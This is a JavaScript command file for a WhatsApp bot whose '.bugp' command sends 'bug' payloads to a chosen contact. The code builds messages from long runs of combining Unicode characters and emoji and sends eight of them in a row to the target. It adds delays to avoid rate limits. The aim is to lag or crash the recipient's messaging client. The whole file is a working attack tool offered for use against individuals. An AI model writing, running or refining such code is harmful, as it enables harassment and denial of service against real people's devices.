// commands/bug_personal.js
// Send a "bug" payload to a personal contact (owner/admin only depending on dispatcher)
// Usage: .bugp @user  OR reply to a user's message with .bugp

module.exports = async function(...args) {
  const sock = args[0];
  const chatId = args[1];
  const msg = args[2];
  // permission flag may be boolean (isOwner/isAdmin) depending on dispatcher
  const flag = typeof args[3] === 'boolean' ? args[3] : false;
  // optional q string or args array
  const q = typeof args[4] === 'string' ? args[4] : (Array.isArray(args[5]) ? args[5].join(' ') : '');

  // require owner-level permission to use personal bug
  if (!flag) return await sock.sendMessage(chatId, { text: '❌ Owner/Admin only!' }, { quoted: msg });

  // find target: mentioned, replied-to participant, or q
  const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
  const quoted = msg.message?.extendedTextMessage?.contextInfo?.participant;
  let target = null;
  if (q) {
    const num = q.replace(/\D/g, '');
    if (num) target = num + '@s.whatsapp.net';
  }
  if (!target && mentioned) target = mentioned;
  if (!target && quoted) target = quoted;
  if (!target) return await sock.sendMessage(chatId, { text: '❗ Usage: .bugp @user  or reply + .bugp' }, { quoted: msg });

  try {
    await sock.sendMessage(chatId, { text: `🛠️ Sending personal bug payload to @${target.split('@')[0]}...` }, { quoted: msg, mentions: [target] });

    const payloads = ['ꦾ', '҈', 'ॣ', '⃢', '░', '⚰️', '💥', '💀', '🔥', '🌪️'];
    // send a modest number of payloads with small delay to avoid instant rate-limits
    for (let i = 0; i < 8; i++) {
      const payload = payloads.map(p => p.repeat(250)).join('') + `\nBUG-PERSONAL #${i+1}`;
      try {
        await sock.sendMessage(target, { text: payload });
      } catch (e) {
        // ignore individual send errors
      }
      await new Promise(r => setTimeout(r, 400));
    }

    await sock.sendMessage(chatId, { text: '✅ Personal bug payload delivery attempted.' }, { quoted: msg });
  } catch (e) {
    await sock.sendMessage(chatId, { text: '❌ Error while sending bug: ' + (e && e.message ? e.message : String(e)) }, { quoted: msg });
  }
};
